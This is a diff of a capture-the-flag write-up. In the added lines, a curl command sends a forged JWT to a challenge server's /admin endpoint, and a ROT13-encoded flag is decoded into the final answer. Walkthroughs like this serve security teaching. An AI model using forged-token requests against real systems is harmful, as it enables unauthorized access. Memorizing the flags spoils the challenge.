@@ -67,12 +67,20 @@ After changing we get out new token
 ![jwt_io.png](https://user-images.githubusercontent.com/73250884/120976121-a8bad780-c78f-11eb-919a-b37128069345.png)
 
 Let's send that token to /admin as our authorization header:
-![send_token](https://user-images.githubusercontent.com/73250884/120974145-67c1c380-c78d-11eb-9df5-1f233fdf92e2.png)
+
+```curl http://3.142.122.1:9334/admin -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF2YV9xd25ldmExMSIsInBhc3N3b3JkIjoiaGFxcnN2YXJxIiwiYWRtaW4iOiJnZWhyIiwiaWF0IjoxNjIzMDUwNTI2fQ.lzzivSQHWUoPxBy4VWv0CdosfDJRZDiOqjR7T36eerQ"
+Hey din_djarin11! Here's your flag: FURYY{G0x3af_q0_z4gg3e_4r91ns4506s384q460s0s0p6r9r5sr4n}
+```
+
+![image](https://user-images.githubusercontent.com/73250884/120977485-000d7780-c791-11eb-8f69-08841c575b3c.png)
 
 ```
 FURYY{G0x3af_q0_z4gg3e_4r91ns4506s384q460s0s0p6r9r5sr4n}
 ```
-Translating this with our subsitutin alphabet or sending it as a username and read that token gives us the flag:
+By doing the rot 13 using cyberchef we get the flag https://gchq.github.io/CyberChef/
+
+![image](https://user-images.githubusercontent.com/73250884/120977731-4a8ef400-c791-11eb-83a6-0dcb1613e7fe.png)
+
 ```
 SHELL{T0k3ns_d0_m4tt3r_4e91af4506f384d460f0f0c6e9e5fe4a}
 ```
